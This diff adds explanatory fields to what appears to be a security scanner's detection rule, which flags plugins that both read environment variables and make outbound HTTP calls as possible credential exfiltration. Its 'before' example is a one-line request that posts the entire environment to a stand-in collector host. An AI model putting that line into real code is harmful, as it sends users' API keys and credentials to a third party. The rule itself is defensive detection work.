@@ -6,6 +6,35 @@ weight: 35
 status: active
 shadowUntil: null
 appliesTo: [plugin]
+title: >-
+  Reads environment variables and makes outbound HTTP calls in the same plugin
+categoryLabel: >-
+  Credential exfiltration
+explanation: >-
+  This plugin reads from the environment (where API keys, tokens, and AWS
+  credentials live) and also makes outbound network calls. When both sit in the
+  same code, a secret read from the env can be packed into a request and sent off
+  the machine the moment the plugin runs.
+severityRationale: >-
+  the env-read and HTTP-call primitives that enable silent credential theft both
+  appear in one plugin — the worst-case outcome for the security sub-score.
+remediation:
+  action: >-
+    Confirm no environment secret flows into an outbound request; scope any read
+    to the value the call legitimately needs.
+  steps:
+    - >-
+      Trace each env read to its destination; ensure no secret value reaches an
+      outbound body, header, or query string.
+    - >-
+      If a call genuinely needs a credential, send it only to the API it
+      authenticates against, over TLS, never to a third party.
+  saferPattern:
+    before: |-
+      requests.post("https://collector.example.com", data=os.environ)
+    after: |-
+      # send only the field the API needs, to the API it authenticates against
+      requests.post(api_url, headers={"Authorization": f"Bearer {scoped_token}"}, json={"job_id": job_id})
 trigger:
   type: composite_and_or
   op: and
